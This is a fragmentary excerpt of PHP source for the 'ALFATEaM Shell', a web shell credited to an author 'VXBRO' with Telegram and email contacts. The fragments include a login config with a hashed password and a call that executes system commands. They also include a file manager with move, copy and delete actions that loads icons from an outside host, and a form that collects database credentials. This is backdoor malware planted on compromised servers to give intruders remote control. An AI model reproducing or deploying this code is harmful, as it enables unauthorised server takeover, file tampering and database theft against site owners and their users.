...
/*
	Author: 	VXBRO
	Telegram: 	https://telegram.me/@vxbro
	Gmail:		altseomarketing@gmail.com
	Date:		Monday, September 14, 2020
*/
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => 'b4e4254ba957d4d004a9cfbb724109bc',//bcrypt(bong.vin)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '0',
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ALFATEaM Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
if(!@ini_get('safe_mode')){if(strlen(alfaEx("id",false,false))>0){
...
<div id='rightclick_menu'>
  ...
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"http://solevisible.com/icons/menu/move.svg\"> Move</a><a href='javascript:void(0);' onclick='alfaPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"http://solevisible.com/icons/menu/copy.svg\"> Copy</a>
...
if($GLOBALS['glob_chdir_false']){
	...
	if(_alfa_is_writable($GLOBALS['cwd'])){
		...
		echo "<script>alfaShowNotification('folderisnt writable !', 'Files manager', 'error');</script>";
	}
}
break;
case 'delete':
...
$table = array('td1' =>
 ...
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'DbName', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
